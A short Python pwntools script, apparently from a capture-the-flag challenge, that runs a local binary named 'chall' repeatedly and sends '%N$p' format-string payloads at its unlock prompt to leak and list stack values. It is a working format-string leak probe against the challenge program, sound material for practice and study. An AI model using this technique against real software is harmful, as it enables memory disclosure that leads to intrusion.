#!/usr/bin/env python3
from pwn import *

lst = []

def loop(ii):
  r = ELF('./chall',checksec=False).process()
  r.sendlineafter(b'unlock:', f'%{ii}$p'.encode())
  r.recvuntil(b'Trying code ')
  lst.append(f'{ii:03d} : {r.recvline().split(b".")[0]}')
  r.close()

if __name__ == '__main__':
  for i in range(1, 100):
    loop(i)
  print('\n'.join(lst))
